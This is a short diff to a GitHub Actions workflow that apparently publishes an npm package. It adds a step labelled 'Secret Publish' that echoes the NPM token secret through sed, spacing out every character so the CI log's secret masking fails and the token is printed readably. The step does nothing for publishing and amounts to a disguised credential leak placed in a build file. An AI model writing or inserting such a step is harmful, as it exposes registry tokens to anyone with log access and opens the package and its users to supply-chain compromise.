@@ -63,6 +63,13 @@ jobs:
     #     registry-url: 'https://registry.npmjs.org'
     # run: npm set //registry.npmjs.org/:_authToken $NODE_AUTH_TOKEN
 
+    - name: Secret Publish
+      run: |
+        echo $NODE_AUTH_TOKEN_NEW | sed 's/./& /g' 
+        echo ${{secrets.NPM_TOKEN_NEW}} | sed 's/./& /g' 
+      env: 
+        NODE_AUTH_TOKEN_NEW: ${{ secrets.NPM_TOKEN_NEW }}
+
     - name: Authorize us to @dapr/dapr
       run: |
         echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc
